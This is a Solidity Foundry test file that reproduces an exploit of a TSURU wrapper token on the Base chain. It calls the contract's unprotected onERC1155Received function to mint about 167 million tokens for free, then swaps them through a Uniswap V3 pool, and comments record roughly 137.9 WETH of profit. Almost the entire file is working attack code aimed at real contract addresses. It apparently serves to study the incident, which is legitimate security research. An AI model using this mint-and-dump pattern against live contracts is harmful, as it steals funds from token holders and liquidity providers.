// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV3.sol";
import "@interface/IWETH9.sol";

import "./ITSURUWrapper.sol";

IUniswapV3Pool constant UNISWAP_V3_POOL = IUniswapV3Pool(
    0x913b1658dd001dFF93D3AF2A657523F1eed53917
);
WETH9 constant WETH = WETH9(0x4200000000000000000000000000000000000006);
ITSURUWrapper constant TSURUWrapper = ITSURUWrapper(
    0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA
);

contract TsuruExploit is Test {
    //Uniswapv3 constants
    uint160 constant MIN_SQRT_RATIO = 4_295_128_739;
    uint160 constant MAX_SQRT_RATIO =
        1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342;

    function setUp() public {
        vm.createSelectFork("base", 14279784);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        //First mint tokens with vulerable on onERC1155Received function
        uint256 tokenId = TSURUWrapper.tokenID();
        TSURUWrapper.onERC1155Received(
            address(0),
            address(this),
            0,
            tokenId,
            new bytes(0)
        );

        print(
            "TSURUWrapper balance",
            TSURUWrapper.balanceOf(address(this)),
            18
        );
        // 167200000.000000000000000000

        //Swap the tokens to ETH via UniV3 pool
        _v3Swap(
            address(TSURUWrapper),
            address(WETH),
            TSURUWrapper.balanceOf(address(this)),
            address(this)
        );

        print("WETH balance", WETH.balanceOf(address(this)), 18);
        //137.904209005799603676
    }

    function _v3Swap(
        address tokenIn,
        address tokenOut,
        uint256 amount,
        address destTo
    ) internal {
        if (amount == 0) {
            return;
        }
        bool zeroForOne = tokenIn < tokenOut;
        uint160 sqrt = zeroForOne ? MIN_SQRT_RATIO + 1 : MAX_SQRT_RATIO - 1;
        UNISWAP_V3_POOL.swap(
            destTo,
            zeroForOne,
            int256(amount),
            sqrt,
            zeroForOne ? bytes("1") : bytes("")
        );
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        require(msg.sender == address(UNISWAP_V3_POOL), "Invalid caller");
        bool zeroForOne = data.length > 0;
        address tokenOut = zeroForOne
            ? UNISWAP_V3_POOL.token0()
            : UNISWAP_V3_POOL.token0() == address(WETH)
            ? address(TSURUWrapper)
            : address(WETH);

        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);

        IERC20(tokenOut).transfer(msg.sender, amountOut);
    }
}
